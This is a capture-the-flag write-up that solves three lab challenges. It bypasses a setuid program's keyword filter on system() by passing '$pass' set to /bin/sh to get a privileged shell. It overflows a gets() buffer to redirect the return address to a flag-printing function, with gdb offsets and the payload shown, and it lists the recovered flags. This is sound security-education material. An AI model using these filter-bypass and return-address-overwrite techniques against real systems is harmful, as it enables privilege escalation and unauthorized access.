# Solutions for Buffer-Overflow CTF

Buffer-Overflow is just a heading, some problems are just basic knowledge of bash.

### you think you know bash???

This problem is elementary based on the basic knowledge of bash.

Firstly, just try if we can open the file (be simple).

```sh
ctf2@ip-172-31-4-22:~/el-ess$ cat flag 
cat: flag: Permission denied
```

Checking the owners and groups flag belong to along with permissions.

```sh
ctf2@ip-172-31-4-22:~/did you do bandit?$ ls -al
total 32
drwxrwxr-x 2 pwnme      pwnme       4096 Jun 10 10:41 .
drwxr-xr-x 7 pwnme      pwnme       4096 Jun 14 08:17 ..
-r--r----- 1 i_am_pwned pwned_group   24 Jun 10 10:41 flag
-rw------- 1 pwnme      pwnme          9 Jun 10 10:22 .gdb_history
-r-sr-xr-x 1 i_am_pwned i_am_pwned  8968 Jun  9 09:24 you think you know bash???
-rw-rw-r-- 1 pwnme      pwnme        722 Jun  9 09:23 you think you know bash???.c
```

Since the owner of executable *"you think you know bash???"* is same as *"flag"* it can access flag file.
Checking its code.

```sh
ctf2@ip-172-31-4-22:~/did you do bandit?$ cat you\ think\ you\ know\ bash\?\?\?.c

#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<string.h>

int filter(char *s){
    int r = 0;
    r+=(int)strstr(s, "/");
    r+=(int)strstr(s, "sh");
    r+=(int)strstr(s, "*");
    r+=(int)strstr(s, "flag");
    r+=(int)strstr(s, "who");
    r+=(int)strstr(s, "PATH");
    r+=(int)strstr(s, "=");
    r+=(int)strstr(s, "{");
    r+=(int)strstr(s, "}");

    return r;
}

int main(int argc, char* argv[]){
    if(argc == 2){
        if(filter(argv[1]))
            exit(1);
        else{
            setenv("PATH", "/nonsense", 1);
            printf("%s", argv[1]);
            system(argv[1]);
        }
    }
    else{
        printf("Usage: ./cmd COMMAND\n");
        exit(1);
    }
    return 0;
}
```

So there is system function, thus we can pass a command to run to the system function in terms of argv[1], so lets try that.
But there is a catch, we can't directly enter the command *"/bin/sh"* as the filter function will not allow us to use that, so manipulating our input, we can pass the argument in the form of a string variable.

**Important!!** the PATH is being altered and thus common commands will not work in the shell so remember to change that.

```sh
ctf2@ip-172-31-4-22:~/did you do bandit?$ export pass=/bin/sh 
ctf2@ip-172-31-4-22:~/did you do bandit?$ ./you\ think\ you\ know\ bash\?\?\? '$pass'

$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/bin:/sbin
$ cat flag
d1d_y0U_$0Lv3_Pw/\/4bl3
```

**Answer - d1d_y0U_$0Lv3_Pw/\/4bl3**

*And yes I did solve pwnable*


### covfefe

Seeing the c code we realized juz needed to run the function capture me, i.e. needed to place the address of the function in the return address of the main function being executed.

```sh
ctf2@ip-172-31-4-22:~/covfefe$ cat covfefe.c

#include<stdio.h>
#include<string.h>

void capture_me()
{
	system("/bin/cat flag");
}

int main()
{
	char s1[50];
	char s2[50];
	printf("Enter your first string:");
	gets(s1);
	printf("Enter your second string:");
	gets(s2);

	char len1 = strlen(s1);
	char len2 = strlen(s2);

	if(len1 + len2 > 100){
		exit(0);
	}

	printf("I forgot the flag :p\n");
	return 0;
}

```

First need to figure out the address of the function capture_me so:

```sh
ctf2@ip-172-31-4-22:~/covfefe$ objdump -D covfefe | grep -A 1 capture_me

000000000040065d <capture_me>:
  40065d:	55                   	push   %rbp

```

Thus, we need to pass the address 0x40065d into the return address pointer.
First figuring out how many characters we need to pass in order to reach the ret pointer.

Running code in gdb and checking the address it shows at last before segmentation fault gives you the idea of how much you need to give to make it overflow.
Like passing 76 characters to both strings.

```sh
gdb-peda$ run

Starting program: /home/pwnme/covfefe/covfefe
Enter your first string:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Enter your second string:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
I forgot the flag :p

Program received signal SIGSEGV, Segmentation fault.

...

Stopped reason: SIGSEGV
0x00007f0041414141 in ?? ()

```

The above result shows we need to pass 78 characters in both strings (as 2 more bytes are left to overflow in the address).
Also we want the overflow address to correspond to **0x00000040065d**

So changing the last 6 characters of first string (due to LIFO) according to the address. (Converting *Hex* to *ASCII*)
* **5d -> ]**
* **06 -> ^F**
* **40 -> @**
* **00 -> ^@**

```sh
ctf2@ip-172-31-4-22:~/covfefe$ ./covfefe 

Enter your first string:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA]^F@^@^@^@
Enter your second string:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
I forgot the flag :p
1$_th12_7h3_l4$7_fl49
Segmentation fault (core dumped)

```

**Answer - 1$_th12_7h3_l4$7_fl49**


### el-ess

I don't know if it is a bug or something but it was done by using cat only
Someone probably changed its permissions so anyone can read it.

```sh
ctf2@ip-172-31-4-22:~/el-ess$ ls -al
total 20
drwxrwxr-x 2 pwnme     pwnme     4096 Jun 12 11:26 .
drwxr-xr-x 7 pwnme     pwnme     4096 Jun 14 08:17 ..
-r-sr-xr-x 1 smart_ass smart_ass 7552 Jun 12 10:40 el-ess
-rw-rw-rw- 1 smart_ass pwnme       28 Jun 12 11:26 flag

ctf2@ip-172-31-4-22:~/el-ess$ cat flag
2t1ll_34$Y_fl49_1$/\/7_17_?
```

**Answer - 2t1ll_34$Y_fl49_1$/\/7_17_?**
